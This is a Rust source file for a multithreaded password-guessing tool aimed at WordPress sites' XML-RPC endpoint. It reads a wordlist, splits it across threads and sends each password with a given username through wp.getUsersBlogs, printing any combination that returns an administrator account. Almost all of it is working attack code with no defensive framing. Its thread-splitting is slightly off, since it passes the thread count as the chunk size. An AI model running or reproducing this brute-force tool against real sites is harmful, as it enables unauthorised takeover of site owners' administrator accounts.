use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::thread::{self};
use url::Url;

use clap::{AppSettings, Parser};
use xmlrpc::Request;

mod errors;
use errors::Error;

const DEFAULT_THREADS_NUM: u8 = 5;

// Arguments definition
#[derive(Parser, Debug, Clone)]
#[clap(author, version, about)]
#[clap(allow_negative_numbers = false)]
#[clap(global_setting(AppSettings::DeriveDisplayOrder))]
pub struct CmdArgs {
    /// Username to use as target for the attack [required]
    #[clap(short = 'u', long)]
    pub username: String,
    /// Dictionary containing the passwords for the attack [required]
    #[clap(short = 'd', long, value_name = "FILE.txt", value_parser = parse_dictionary_path)]
    pub dictionary: String,
    /// XML RPC API url for the attack [required]
    #[clap(short = 'x', long, value_parser = parse_xml_url)]
    pub xml_url: String,
    /// Number of threads to run [optional, default=5]
    #[clap(short = 't', long, value_parser = clap::value_parser!(u8))]
    pub threads_num: Option<u8>,
}

fn parse_dictionary_path(dictionary_arg: &str) -> Result<String, String> {
    Path::new(dictionary_arg)
        .try_exists()
        .map(|exst| {
            if exst {
                Ok(dictionary_arg.into())
            } else {
                Err(Error::PathDoesNotExist(dictionary_arg.into()).into())
            }
        })
        .map_err(|_| Error::UnableToParseArg(dictionary_arg.into()))?
}

fn parse_xml_url(xml_url_arg: &str) -> Result<String, String> {
    Url::parse(xml_url_arg)
        .map(|url| Ok(url.into()))
        .map_err(|_| Error::UnableToParseUrl(xml_url_arg.into()))?
}

fn read_dictionary(dictionary_arg: &str) -> Result<Vec<String>, Error> {
    let file = File::open(dictionary_arg).map_err(|e| Error::UnableToReadFile(e))?;
    let reader = BufReader::new(file);

    let mut lines = Vec::new();
    for line in reader.lines() {
        lines.push(line.map_err(|e| Error::UnableToReadLine(e))?);
    }

    Ok(lines)
}

/// This function performs the real attack to the target host
fn attack(username: &str, dict_chunk: &[String], url: &str) {
    // For each password in the chunk we create a request and then perform the multicall
    for password in dict_chunk {
        // Here is an example of calling wp.getUsersBlog but it can be any method exposed by the API
        let req = Request::new("wp.getUsersBlogs")
            .arg(username)
            .arg(password.as_str());

        if let Ok(res) = req.call_url(url) {
            if let Some(res) = res.as_array() {
                // We have some result
                for v in res {
                    if let Some(data_struct) = v.as_struct() {
                        // Check the hit
                        if let Some(admin_info) = data_struct.get("isAdmin") {
                            if admin_info.as_bool() == Some(true) {
                                println!(
                                    "Found match: username='{}', password='{}'",
                                    username, password
                                );
                                return;
                            }
                        }
                    }
                }
            }
        }
    }

    println!("No match found.");
}

pub fn main() {
    let args = CmdArgs::parse();

    // Read the wordlist from the dictionary and divide it in chunks
    let wordlist = read_dictionary(&args.dictionary).unwrap();

    thread::scope(|s| {
        let mut threads = vec![];

        wordlist
            .chunks(args.threads_num.unwrap_or(DEFAULT_THREADS_NUM).into())
            .for_each(|dict_chunk| {
                threads.push(s.spawn(|| attack(&args.username, dict_chunk, &args.xml_url)));
            });

        for t in threads {
            let _ = t.join();
        }
    });
}
